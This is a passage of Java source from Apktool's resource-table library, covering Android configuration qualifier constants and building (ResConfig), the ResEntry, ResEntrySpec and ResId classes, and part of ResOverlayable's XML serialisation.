    public static final int SDK_GINGERBREAD = 9;
    public static final int SDK_GINGERBREAD_MR1 = 10;
    public static final int SDK_HONEYCOMB = 11;
    public static final int SDK_HONEYCOMB_MR1 = 12;
    public static final int SDK_HONEYCOMB_MR2 = 13;
    public static final int SDK_ICE_CREAM_SANDWICH = 14;
    public static final int SDK_ICE_CREAM_SANDWICH_MR1 = 15;
    public static final int SDK_JELLY_BEAN = 16;
    public static final int SDK_JELLY_BEAN_MR1 = 17;
    public static final int SDK_JELLY_BEAN_MR2 = 18;
    public static final int SDK_KITKAT = 19;
    public static final int SDK_LOLLIPOP = 21;
    public static final int SDK_LOLLIPOP_MR1 = 22;
    public static final int SDK_MNC = 23;
    public static final int SDK_NOUGAT = 24;
    public static final int SDK_NOUGAT_MR1 = 25;
    public static final int SDK_OREO = 26;
    public static final int SDK_OREO_MR1 = 27;
    public static final int SDK_P = 28;
    public static final int SDK_Q = 29;
    public static final int SDK_R = 30;
    public static final int SDK_S = 31;
    public static final int SDK_S_V2 = 32;
    public static final int SDK_TIRAMISU = 33;
    public static final int SDK_UPSIDEDOWN_CAKE = 34;
    public static final int SDK_VANILLA_ICE_CREAM = 35;
    public static final int SDK_BAKLAVA = 36;

    // AOSP has this as 10,000 for dev purposes.
    // platform_frameworks_base/commit/c7a1109a1fe0771d4c9b572dcf178e2779fc4f2d
    public static final int SDK_DEVELOPMENT = 10000;

    public static final int MNC_ZERO = 0xFFFF;

    public static final int ORIENTATION_ANY = 0x00;
    public static final int ORIENTATION_PORT = 0x01;
    public static final int ORIENTATION_LAND = 0x02;
    public static final int ORIENTATION_SQUARE = 0x03;

    public static final int TOUCHSCREEN_ANY = 0x00;
    public static final int TOUCHSCREEN_NOTOUCH = 0x01;
    public static final int TOUCHSCREEN_STYLUS = 0x02;
    public static final int TOUCHSCREEN_FINGER = 0x03;

    public static final int DENSITY_DEFAULT = 0;
    public static final int DENSITY_LOW = 120;
    public static final int DENSITY_MEDIUM = 160;
    public static final int DENSITY_TV = 213;
    public static final int DENSITY_HIGH = 240;
    public static final int DENSITY_XHIGH = 320;
    public static final int DENSITY_XXHIGH = 480;
    public static final int DENSITY_XXXHIGH = 640;
    public static final int DENSITY_ANY = 0xFFFE;
    public static final int DENSITY_NONE = 0xFFFF;

    public static final int KEYBOARD_ANY = 0x00;
    public static final int KEYBOARD_NOKEYS = 0x01;
    public static final int KEYBOARD_QWERTY = 0x02;
    public static final int KEYBOARD_12KEY = 0x03;

    public static final int NAVIGATION_ANY = 0x00;
    public static final int NAVIGATION_NONAV = 0x01;
    public static final int NAVIGATION_DPAD = 0x02;
    public static final int NAVIGATION_TRACKBALL = 0x03;
    public static final int NAVIGATION_WHEEL = 0x04;

    public static final int MASK_KEYSHIDDEN = 0x03;
    public static final int KEYSHIDDEN_ANY = 0x00;
    public static final int KEYSHIDDEN_NO = 0x01;
    public static final int KEYSHIDDEN_YES = 0x02;
    public static final int KEYSHIDDEN_SOFT = 0x03;

    public static final int SHIFT_NAVHIDDEN = 2;
    public static final int MASK_NAVHIDDEN = 0x03 << SHIFT_NAVHIDDEN; // 0x0C
    public static final int NAVHIDDEN_ANY = 0x00 << SHIFT_NAVHIDDEN; // 0x00
    public static final int NAVHIDDEN_NO = 0x01 << SHIFT_NAVHIDDEN; // 0x04
    public static final int NAVHIDDEN_YES = 0x02 << SHIFT_NAVHIDDEN; // 0x08

    public static final int MASK_GRAMMATICAL_GENDER = 0x03;
    public static final int GRAMMATICAL_GENDER_ANY = 0x00;
    public static final int GRAMMATICAL_GENDER_NEUTER = 0x01;
    public static final int GRAMMATICAL_GENDER_FEMININE = 0x02;
    public static final int GRAMMATICAL_GENDER_MASCULINE = 0x03;

    public static final int MASK_SCREENSIZE = 0x0F;
    public static final int SCREENSIZE_ANY = 0x00;
    public static final int SCREENSIZE_SMALL = 0x01;
    public static final int SCREENSIZE_NORMAL = 0x02;
    public static final int SCREENSIZE_LARGE = 0x03;
    public static final int SCREENSIZE_XLARGE = 0x04;

    public static final int SHIFT_SCREENLONG = 4;
    public static final int MASK_SCREENLONG = 0x03 << SHIFT_SCREENLONG; // 0x30
    public static final int SCREENLONG_ANY = 0x00 << SHIFT_SCREENLONG; // 0x00
    public static final int SCREENLONG_NO = 0x01 << SHIFT_SCREENLONG; // 0x10
    public static final int SCREENLONG_YES = 0x02 << SHIFT_SCREENLONG; // 0x20

    public static final int SHIFT_LAYOUTDIR = 6;
    public static final int MASK_LAYOUTDIR = 0x03 << SHIFT_LAYOUTDIR; // 0xC0
    public static final int LAYOUTDIR_ANY = 0x00 << SHIFT_LAYOUTDIR; // 0x00
    public static final int LAYOUTDIR_LTR = 0x01 << SHIFT_LAYOUTDIR; // 0x40
    public static final int LAYOUTDIR_RTL = 0x02 << SHIFT_LAYOUTDIR; // 0x80

    public static final int MASK_UI_MODE_TYPE = 0x0F;
    public static final int UI_MODE_TYPE_ANY = 0x00;
    public static final int UI_MODE_TYPE_NORMAL = 0x01;
    public static final int UI_MODE_TYPE_DESK = 0x02;
    public static final int UI_MODE_TYPE_CAR = 0x03;
    public static final int UI_MODE_TYPE_TELEVISION = 0x04;
    public static final int UI_MODE_TYPE_APPLIANCE = 0x05;
    public static final int UI_MODE_TYPE_WATCH = 0x06;
    public static final int UI_MODE_TYPE_VR_HEADSET = 0x07;
    public static final int UI_MODE_TYPE_GODZILLAUI = 0x0B; // MIUI
    public static final int UI_MODE_TYPE_SMALLUI = 0x0C; // MIUI
    public static final int UI_MODE_TYPE_MEDIUMUI = 0x0D; // MIUI
    public static final int UI_MODE_TYPE_LARGEUI = 0x0E; // MIUI
    public static final int UI_MODE_TYPE_HUGEUI = 0x0F; // MIUI

    public static final int SHIFT_UI_MODE_NIGHT = 4;
    public static final int MASK_UI_MODE_NIGHT = 0x03 << SHIFT_UI_MODE_NIGHT; // 0x30
    public static final int UI_MODE_NIGHT_ANY = 0x00 << SHIFT_UI_MODE_NIGHT; // 0x00
    public static final int UI_MODE_NIGHT_NO = 0x01 << SHIFT_UI_MODE_NIGHT; // 0x10
    public static final int UI_MODE_NIGHT_YES = 0x02 << SHIFT_UI_MODE_NIGHT; // 0x20

    public static final int MASK_SCREENROUND = 0x03;
    public static final int SCREENROUND_ANY = 0x00;
    public static final int SCREENROUND_NO = 0x01;
    public static final int SCREENROUND_YES = 0x02;

    public static final int MASK_COLOR_MODE_WIDECG = 0x03;
    public static final int COLOR_MODE_WIDECG_ANY = 0x00;
    public static final int COLOR_MODE_WIDECG_NO = 0x01;
    public static final int COLOR_MODE_WIDECG_YES = 0x02;

    public static final int SHIFT_COLOR_MODE_HDR = 2;
    public static final int MASK_COLOR_MODE_HDR = 0x03 << SHIFT_COLOR_MODE_HDR; // 0x0C
    public static final int COLOR_MODE_HDR_ANY = 0x00 << SHIFT_COLOR_MODE_HDR; // 0x00
    public static final int COLOR_MODE_HDR_NO = 0x01 << SHIFT_COLOR_MODE_HDR; // 0x04
    public static final int COLOR_MODE_HDR_YES = 0x02 << SHIFT_COLOR_MODE_HDR; // 0x08

    public static final ResConfig DEFAULT = new ResConfig();

    private final int mMcc;
    private final int mMnc;
    private final String mLanguage;
    private final String mRegion;
    private final int mOrientation;
    private final int mTouchscreen;
    private final int mDensity;
    private final int mKeyboard;
    private final int mNavigation;
    private final int mInputFlags;
    private final int mGrammaticalInflection;
    private final int mScreenWidth;
    private final int mScreenHeight;
    private final int mSdkVersion;
    private final int mMinorVersion;
    private final int mScreenLayout;
    private final int mUiMode;
    private final int mSmallestScreenWidthDp;
    private final int mScreenWidthDp;
    private final int mScreenHeightDp;
    private final String mLocaleScript;
    private final String mLocaleVariant;
    private final int mScreenLayout2;
    private final int mColorMode;
    private final byte[] mUnknown;

    private final String mQualifiers;
    private final boolean mIsInvalid;

    private ResConfig() {
        mMcc = 0;
        mMnc = 0;
        mLanguage = "";
        mRegion = "";
        mOrientation = ORIENTATION_ANY;
        mTouchscreen = TOUCHSCREEN_ANY;
        mDensity = DENSITY_DEFAULT;
        mKeyboard = KEYBOARD_ANY;
        mNavigation = NAVIGATION_ANY;
        mInputFlags = KEYSHIDDEN_ANY | NAVHIDDEN_ANY;
        mGrammaticalInflection = GRAMMATICAL_GENDER_ANY;
        mScreenWidth = 0;
        mScreenHeight = 0;
        mSdkVersion = 0;
        mMinorVersion = 0;
        mScreenLayout = SCREENSIZE_ANY | SCREENLONG_ANY;
        mUiMode = UI_MODE_TYPE_ANY | UI_MODE_NIGHT_ANY;
        mSmallestScreenWidthDp = 0;
        mScreenWidthDp = 0;
        mScreenHeightDp = 0;
        mLocaleScript = "";
        mLocaleVariant = "";
        mScreenLayout2 = 0;
        mColorMode = COLOR_MODE_WIDECG_ANY | COLOR_MODE_HDR_ANY;
        mUnknown = null;
        mQualifiers = "";
        mIsInvalid = false;
    }

    public ResConfig(int mcc, int mnc, String language, String region, int orientation, int touchscreen, int density,
                     int keyboard, int navigation, int inputFlags, int grammaticalInflection, int screenWidth,
                     int screenHeight, int sdkVersion, int minorVersion, int screenLayout, int uiMode,
                     int smallestScreenWidthDp, int screenWidthDp, int screenHeightDp, String localeScript,
                     String localeVariant, int screenLayout2, int colorMode, byte[] unknown) {
        mMcc = mcc;
        mMnc = mnc;
        mLanguage = language;
        mRegion = region;
        mOrientation = orientation;
        mTouchscreen = touchscreen;
        mDensity = density;
        mKeyboard = keyboard;
        mNavigation = navigation;
        mInputFlags = inputFlags;
        mGrammaticalInflection = grammaticalInflection;
        mScreenWidth = screenWidth;
        mScreenHeight = screenHeight;
        mSdkVersion = sdkVersion;
        mMinorVersion = minorVersion;
        mScreenLayout = screenLayout;
        mUiMode = uiMode;
        mSmallestScreenWidthDp = smallestScreenWidthDp;
        mScreenWidthDp = screenWidthDp;
        mScreenHeightDp = screenHeightDp;
        mLocaleScript = localeScript;
        mLocaleVariant = localeVariant;
        mScreenLayout2 = screenLayout2;
        mColorMode = colorMode;
        mUnknown = unknown;
        boolean[] isInvalid = new boolean[1];
        mQualifiers = computeQualifiers(isInvalid);
        mIsInvalid = isInvalid[0];
    }

    private String computeQualifiers(boolean[] isInvalid) {
        StringBuilder sb = new StringBuilder();
        if (mMcc != 0) {
            sb.append("-mcc").append(String.format(Locale.ROOT, "%03d", mMcc));
        }
        if (mMnc != 0) {
            sb.append("-mnc").append(String.format(Locale.ROOT, "%02d", mMnc == MNC_ZERO ? 0 : mMnc));
        }
        if (!mLanguage.isEmpty()) {
            if (mLocaleScript.isEmpty() && (mRegion.isEmpty() || mRegion.length() == 2) && mLocaleVariant.isEmpty()) {
                // Legacy format.
                sb.append('-').append(mLanguage);
                if (!mRegion.isEmpty()) {
                    sb.append("-r").append(mRegion);
                }
            } else {
                // Modified BCP 47 format.
                sb.append("-b+");
                sb.append(mLanguage);
                if (!mLocaleScript.isEmpty()) {
                    sb.append('+').append(mLocaleScript);
                }
                if (!mRegion.isEmpty()) {
                    sb.append('+').append(mRegion);
                }
                if (!mLocaleVariant.isEmpty()) {
                    sb.append('+').append(mLocaleVariant);
                }
            }
        }
        switch (mGrammaticalInflection & MASK_GRAMMATICAL_GENDER) {
            case GRAMMATICAL_GENDER_ANY:
                break;
            case GRAMMATICAL_GENDER_NEUTER:
                sb.append("-neuter");
                break;
            case GRAMMATICAL_GENDER_FEMININE:
                sb.append("-feminine");
                break;
            case GRAMMATICAL_GENDER_MASCULINE:
                sb.append("-masculine");
                break;
            default:
                sb.append("-grammaticalGender=").append(mGrammaticalInflection & MASK_GRAMMATICAL_GENDER);
                isInvalid[0] = true;
                break;
        }
        switch (mScreenLayout & MASK_LAYOUTDIR) {
            case LAYOUTDIR_ANY:
                break;
            case LAYOUTDIR_LTR:
                sb.append("-ldltr");
                break;
            case LAYOUTDIR_RTL:
                sb.append("-ldrtl");
                break;
            default:
                sb.append("-layoutDir=").append(mScreenLayout & MASK_LAYOUTDIR);
                isInvalid[0] = true;
                break;
        }
        if (mSmallestScreenWidthDp != 0) {
            sb.append("-sw").append(mSmallestScreenWidthDp).append("dp");
        }
        if (mScreenWidthDp != 0) {
            sb.append("-w").append(mScreenWidthDp).append("dp");
        }
        if (mScreenHeightDp != 0) {
            sb.append("-h").append(mScreenHeightDp).append("dp");
        }
        switch (mScreenLayout & MASK_SCREENSIZE) {
            case SCREENSIZE_ANY:
                break;
            case SCREENSIZE_SMALL:
                sb.append("-small");
                break;
            case SCREENSIZE_NORMAL:
                sb.append("-normal");
                break;
            case SCREENSIZE_LARGE:
                sb.append("-large");
                break;
            case SCREENSIZE_XLARGE:
                sb.append("-xlarge");
                break;
            default:
                sb.append("-screenSize=").append(mScreenLayout & MASK_SCREENSIZE);
                isInvalid[0] = true;
                break;
        }
        switch (mScreenLayout & MASK_SCREENLONG) {
            case SCREENLONG_ANY:
                break;
            case SCREENLONG_NO:
                sb.append("-notlong");
                break;
            case SCREENLONG_YES:
                sb.append("-long");
                break;
            default:
                sb.append("-screenLong=").append(mScreenLayout & MASK_SCREENLONG);
                isInvalid[0] = true;
                break;
        }
        switch (mScreenLayout2 & MASK_SCREENROUND) {
            case SCREENROUND_ANY:
                break;
            case SCREENROUND_NO:
                sb.append("-notround");
                break;
            case SCREENROUND_YES:
                sb.append("-round");
                break;
            default:
                sb.append("-screenRound=").append(mScreenLayout2 & MASK_SCREENROUND);
                isInvalid[0] = true;
                break;
        }
        switch (mColorMode & MASK_COLOR_MODE_WIDECG) {
            case COLOR_MODE_WIDECG_ANY:
                break;
            case COLOR_MODE_WIDECG_NO:
                sb.append("-nowidecg");
                break;
            case COLOR_MODE_WIDECG_YES:
                sb.append("-widecg");
                break;
            default:
                sb.append("-colorModeWideCG=").append(mColorMode & MASK_COLOR_MODE_WIDECG);
                isInvalid[0] = true;
                break;
        }
        switch (mColorMode & MASK_COLOR_MODE_HDR) {
            case COLOR_MODE_HDR_ANY:
                break;
            case COLOR_MODE_HDR_NO:
                sb.append("-lowdr");
                break;
            case COLOR_MODE_HDR_YES:
                sb.append("-highdr");
                break;
            default:
                sb.append("-colorModeHdr=").append(mColorMode & MASK_COLOR_MODE_HDR);
                isInvalid[0] = true;
                break;
        }
        switch (mOrientation) {
            case ORIENTATION_ANY:
                break;
            case ORIENTATION_PORT:
                sb.append("-port");
                break;
            case ORIENTATION_LAND:
                sb.append("-land");
                break;
            case ORIENTATION_SQUARE:
                sb.append("-square");
                break;
            default:
                sb.append("-orientation=").append(mOrientation);
                isInvalid[0] = true;
                break;
        }
        switch (mUiMode & MASK_UI_MODE_TYPE) {
            case UI_MODE_TYPE_ANY:
            case UI_MODE_TYPE_NORMAL:
                break;
            case UI_MODE_TYPE_DESK:
                sb.append("-desk");
                break;
            case UI_MODE_TYPE_CAR:
                sb.append("-car");
                break;
            case UI_MODE_TYPE_TELEVISION:
                sb.append("-television");
                break;
            case UI_MODE_TYPE_APPLIANCE:
                sb.append("-appliance");
                break;
            case UI_MODE_TYPE_WATCH:
                sb.append("-watch");
                break;
            case UI_MODE_TYPE_VR_HEADSET:
                sb.append("-vrheadset");
                break;
            case UI_MODE_TYPE_GODZILLAUI:
                sb.append("-godzillaui");
                break;
            case UI_MODE_TYPE_SMALLUI:
                sb.append("-smallui");
                break;
            case UI_MODE_TYPE_MEDIUMUI:
                sb.append("-mediumui");
                break;
            case UI_MODE_TYPE_LARGEUI:
                sb.append("-largeui");
                break;
            case UI_MODE_TYPE_HUGEUI:
                sb.append("-hugeui");
                break;
            default:
                sb.append("-uiModeType=").append(mUiMode & MASK_UI_MODE_TYPE);
                isInvalid[0] = true;
                break;
        }
        switch (mUiMode & MASK_UI_MODE_NIGHT) {
            case UI_MODE_NIGHT_ANY:
                break;
            case UI_MODE_NIGHT_NO:
                sb.append("-notnight");
                break;
            case UI_MODE_NIGHT_YES:
                sb.append("-night");
                break;
            default:
                sb.append("-uiModeNight=").append(mUiMode & MASK_UI_MODE_NIGHT);
                isInvalid[0] = true;
                break;
        }
        switch (mDensity) {
            case DENSITY_DEFAULT:
                break;
            case DENSITY_LOW:
                sb.append("-ldpi");
                break;
            case DENSITY_MEDIUM:
                sb.append("-mdpi");
                break;
            case DENSITY_TV:
                sb.append("-tvdpi");
                break;
            case DENSITY_HIGH:
                sb.append("-hdpi");
                break;
            case DENSITY_XHIGH:
                sb.append("-xhdpi");
                break;
            case DENSITY_XXHIGH:
                sb.append("-xxhdpi");
                break;
            case DENSITY_XXXHIGH:
                sb.append("-xxxhdpi");
                break;
            case DENSITY_ANY:
                sb.append("-anydpi");
                break;
            case DENSITY_NONE:
                sb.append("-nodpi");
                break;
            default:
                sb.append('-').append(mDensity).append("dpi");
                break;
        }
        switch (mTouchscreen) {
            case TOUCHSCREEN_ANY:
                break;
            case TOUCHSCREEN_NOTOUCH:
                sb.append("-notouch");
                break;
            case TOUCHSCREEN_STYLUS:
                sb.append("-stylus");
                break;
            case TOUCHSCREEN_FINGER:
                sb.append("-finger");
                break;
            default:
                sb.append("-touchscreen=").append(mTouchscreen);
                isInvalid[0] = true;
                break;
        }
        switch (mInputFlags & MASK_KEYSHIDDEN) {
            case KEYSHIDDEN_ANY:
                break;
            case KEYSHIDDEN_NO:
                sb.append("-keysexposed");
                break;
            case KEYSHIDDEN_YES:
                sb.append("-keyshidden");
                break;
            case KEYSHIDDEN_SOFT:
                sb.append("-keyssoft");
                break;
            default:
                sb.append("-keysHidden=").append(mInputFlags & MASK_KEYSHIDDEN);
                isInvalid[0] = true;
                break;
        }
        switch (mKeyboard) {
            case KEYBOARD_ANY:
                break;
            case KEYBOARD_NOKEYS:
                sb.append("-nokeys");
                break;
            case KEYBOARD_QWERTY:
                sb.append("-qwerty");
                break;
            case KEYBOARD_12KEY:
                sb.append("-12key");
                break;
            default:
                sb.append("-keyboard=").append(mKeyboard);
                isInvalid[0] = true;
                break;
        }
        switch (mInputFlags & MASK_NAVHIDDEN) {
            case NAVHIDDEN_ANY:
                break;
            case NAVHIDDEN_NO:
                sb.append("-navexposed");
                break;
            case NAVHIDDEN_YES:
                sb.append("-navhidden");
                break;
            default:
                sb.append("-navHidden=").append(mInputFlags & MASK_NAVHIDDEN);
                isInvalid[0] = true;
                break;
        }
        switch (mNavigation) {
            case NAVIGATION_ANY:
                break;
            case NAVIGATION_NONAV:
                sb.append("-nonav");
                break;
            case NAVIGATION_DPAD:
                sb.append("-dpad");
                break;
            case NAVIGATION_TRACKBALL:
                sb.append("-trackball");
                break;
            case NAVIGATION_WHEEL:
                sb.append("-wheel");
                break;
            default:
                sb.append("-navigation=").append(mNavigation);
                isInvalid[0] = true;
                break;
        }
        if (mScreenWidth != 0 && mScreenHeight != 0) {
            sb.append('-').append(mScreenWidth).append('x').append(mScreenHeight);
        }
        if (mSdkVersion != 0) {
            sb.append("-v").append(mSdkVersion);
        }
        if (mUnknown != null) {
            // We have to separate unknown resources to avoid conflicts.
            sb.append("-unk").append(String.format("%08X", Arrays.hashCode(mUnknown)));
            isInvalid[0] = true;
        }
        return sb.toString();
    }

    public boolean isInvalid() {
        return mIsInvalid;
    }

    public String toQualifiers() {
        return mQualifiers;
    }

    @Override
    public String toString() {
        return "[" + (!mQualifiers.isEmpty() ? mQualifiers.substring(1) : "DEFAULT") + "]";
    }

    @Override
    public boolean equals(Object obj) {
        if (obj == this) {
            return true;
        }
        if (obj instanceof ResConfig) {
            ResConfig other = (ResConfig) obj;
            return mQualifiers.equals(other.mQualifiers);
        }
        return false;
    }

    @Override
    public int hashCode() {
        return mQualifiers.hashCode();
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/table/ResEntry.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.table;

import brut.androlib.res.table.value.ResValue;

import java.util.Objects;

public class ResEntry {
    private final ResType mType;
    private final ResEntrySpec mSpec;
    private ResValue mValue; // might be updated later

    public ResEntry(ResType type, ResEntrySpec spec, ResValue value) {
        assert type != null && spec != null && type.getSpec() == spec.getTypeSpec() && value != null;
        mType = type;
        mSpec = spec;
        mValue = value;
    }

    public ResPackage getPackage() {
        return mType.getPackage();
    }

    public ResType getType() {
        return mType;
    }

    public ResEntrySpec getSpec() {
        return mSpec;
    }

    public int getId() {
        return mSpec.getId();
    }

    public ResId getResId() {
        return mSpec.getResId();
    }

    public String getName() {
        return mSpec.getName();
    }

    public ResValue getValue() {
        return mValue;
    }

    public void setValue(ResValue value) {
        mValue = value;
    }

    @Override
    public String toString() {
        return String.format("ResEntry{type=%s, spec=%s, value=%s}", mType, mSpec, mValue);
    }

    @Override
    public boolean equals(Object obj) {
        if (obj == this) {
            return true;
        }
        if (obj instanceof ResEntry) {
            ResEntry other = (ResEntry) obj;
            return mType.equals(other.mType)
                && mSpec.equals(other.mSpec);
        }
        return false;
    }

    @Override
    public int hashCode() {
        return Objects.hash(mType, mSpec);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/table/ResEntrySpec.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.table;

import java.util.Objects;

public class ResEntrySpec {
    public static final String DUMMY_PREFIX = "APKTOOL_DUMMY_";
    public static final String RENAMED_PREFIX = "APKTOOL_RENAMED_";

    private final ResTypeSpec mTypeSpec;
    private final int mId;
    private final ResId mResId;
    private final String mName;

    public ResEntrySpec(ResTypeSpec typeSpec, int id, String name) {
        assert typeSpec != null && id >= 0 && name != null;
        mTypeSpec = typeSpec;
        mId = id;
        mResId = ResId.of(typeSpec.getPackage().getId(), typeSpec.getId(), id);
        // Some apps had their entry names obfuscated or collapsed to a single value in the key string pool.
        mName = isValidEntryName(name) ? name : RENAMED_PREFIX + mResId;
    }

    private static boolean isValidEntryName(String name) {
        // Must not be empty.
        int len = name.length();
        if (len == 0) {
            return false;
        }
        // Must start with a valid Java identifier start character.
        if (!Character.isJavaIdentifierStart(name.charAt(0))) {
            return false;
        }
        // The rest must be valid Java identifier part characters or any of the whitelisted special characters.
        for (int i = 1; i < len; i++) {
            char ch = name.charAt(i);
            if (!Character.isJavaIdentifierPart(ch) && ch != '.' && ch != '-') {
                return false;
            }
        }
        return true;
    }

    public ResPackage getPackage() {
        return mTypeSpec.getPackage();
    }

    public ResTypeSpec getTypeSpec() {
        return mTypeSpec;
    }

    public int getId() {
        return mId;
    }

    public ResId getResId() {
        return mResId;
    }

    public String getName() {
        return mName;
    }

    @Override
    public String toString() {
        return String.format("ResEntrySpec{typeSpec=%s, id=0x%04x, name=%s}", mTypeSpec, mId, mName);
    }

    @Override
    public boolean equals(Object obj) {
        if (obj == this) {
            return true;
        }
        if (obj instanceof ResEntrySpec) {
            ResEntrySpec other = (ResEntrySpec) obj;
            return mTypeSpec.equals(other.mTypeSpec)
                && mId == other.mId
                && mName.equals(other.mName);
        }
        return false;
    }

    @Override
    public int hashCode() {
        return Objects.hash(mTypeSpec, mId, mName);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/table/ResId.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.table;

import java.util.HashMap;
import java.util.Map;

public class ResId extends Number implements Comparable<ResId> {
    public static final ResId NULL = new ResId(0);

    private static final Map<Integer, ResId> sCache = new HashMap<>();

    private final int mId;

    private ResId(int id) {
        mId = id;
    }

    public static ResId of(int id) {
        return id != 0 ? sCache.computeIfAbsent(id, ResId::new) : NULL;
    }

    public static ResId of(int pkgId, int typeId, int entryId) {
        assert (pkgId & 0xFF) == pkgId && (typeId & 0xFF) == typeId && (entryId & 0xFFFF) == entryId;
        return of((pkgId << 24) | (typeId << 16) | entryId);
    }

    public int pkgId() {
        return (mId >>> 24) & 0xFF;
    }

    public int typeId() {
        return (mId >>> 16) & 0xFF;
    }

    public int entryId() {
        return mId & 0xFFFF;
    }

    @Override
    public int intValue() {
        return mId;
    }

    @Override
    public long longValue() {
        return mId;
    }

    @Override
    public float floatValue() {
        return mId;
    }

    @Override
    public double doubleValue() {
        return mId;
    }

    @Override
    public String toString() {
        return String.format("0x%08x", mId);
    }

    @Override
    public boolean equals(Object obj) {
        if (obj == this) {
            return true;
        }
        if (obj instanceof ResId) {
            ResId other = (ResId) obj;
            return mId == other.mId;
        }
        return false;
    }

    @Override
    public int hashCode() {
        return Integer.hashCode(mId);
    }

    @Override
    public int compareTo(ResId other) {
        return Integer.compare(mId, other.mId);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/table/ResOverlayable.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.table;

import brut.androlib.exceptions.UndefinedResObjectException;
import brut.common.Log;
import org.xmlpull.v1.XmlSerializer;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Objects;
import java.util.List;

public class ResOverlayable {
    private static final String TAG = ResOverlayable.class.getName();

    private static final int FLAG_NONE = 0;
    private static final int FLAG_PUBLIC = 1 << 0; // 0x0001
    private static final int FLAG_SYSTEM_PARTITION = 1 << 1; // 0x0002
    private static final int FLAG_VENDOR_PARTITION = 1 << 2; // 0x0004
    private static final int FLAG_PRODUCT_PARTITION = 1 << 3; // 0x0008
    private static final int FLAG_SIGNATURE = 1 << 4; // 0x0010
    private static final int FLAG_ODM_PARTITION = 1 << 5; // 0x0020
    private static final int FLAG_OEM_PARTITION = 1 << 6; // 0x0040
    private static final int FLAG_ACTOR_SIGNATURE = 1 << 7; // 0x0080
    private static final int FLAG_CONFIG_SIGNATURE = 1 << 8; // 0x0100

    private static final int[] FLAG_MASKS = {
        FLAG_PUBLIC, FLAG_SYSTEM_PARTITION, FLAG_VENDOR_PARTITION, FLAG_PRODUCT_PARTITION, FLAG_SIGNATURE,
        FLAG_ODM_PARTITION, FLAG_OEM_PARTITION, FLAG_ACTOR_SIGNATURE, FLAG_CONFIG_SIGNATURE
    };
    private static final String[] FLAG_NAMES = {
        "public", "system", "vendor", "product", "signature", "odm", "oem", "actor", "config_signature"
    };

    private final ResPackage mPackage;
    private final String mName;
    private final String mActor;
    private final List<Policy> mPolicies;

    public ResOverlayable(ResPackage pkg, String name, String actor) {
        assert pkg != null && name != null && actor != null;
        mPackage = pkg;
        mName = name;
        mActor = actor;
        mPolicies = new ArrayList<>();
    }

    public ResPackage getPackage() {
        return mPackage;
    }

    public String getName() {
        return mName;
    }

    public String getActor() {
        return mActor;
    }

    public void addPolicy(int flags, ResId[] entries) {
        mPolicies.add(new Policy(flags, entries));
    }

    public void serializeToXml(XmlSerializer serial) throws IOException {
        if (mPolicies.isEmpty()) {
            return;
        }

        serial.startTag(null, "overlayable");
        serial.attribute(null, "name", mName);
        if (!mActor.isEmpty()) {
            serial.attribute(null, "actor", mActor);
        }

        for (Policy policy : mPolicies) {
            String type = renderType(policy.getFlags());
            ResEntrySpec[] entrySpecs = resolveEntries(policy.getEntries());
            if (type == null || entrySpecs == null) {
                continue;
            }

            serial.startTag(null, "policy");
            serial.attribute(null, "type", type);

            for (ResEntrySpec entrySpec : entrySpecs) {
                serial.startTag(null, "item");
                serial.attribute(null, "type", entrySpec.getTypeSpec().getName());
                serial.attribute(null, "name", entrySpec.getName());
                serial.endTag(null, "item");
            }

            serial.endTag(null, "policy");
        }

        serial.endTag(null, "overlayable");
    }

    private String renderType(int flags) {
        if (flags == FLAG_NONE) {
            return null;
        }
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < FLAG_MASKS.length; i++) {
            if ((flags & FLAG_MASKS[i]) != 0) {
                if (sb.length() > 0) {
                    sb.append('|');
                }
                sb.append(FLAG_NAMES[i]);
            }
        }
        if (sb.length() == 0) {
            return null;
        }
        return sb.toString();
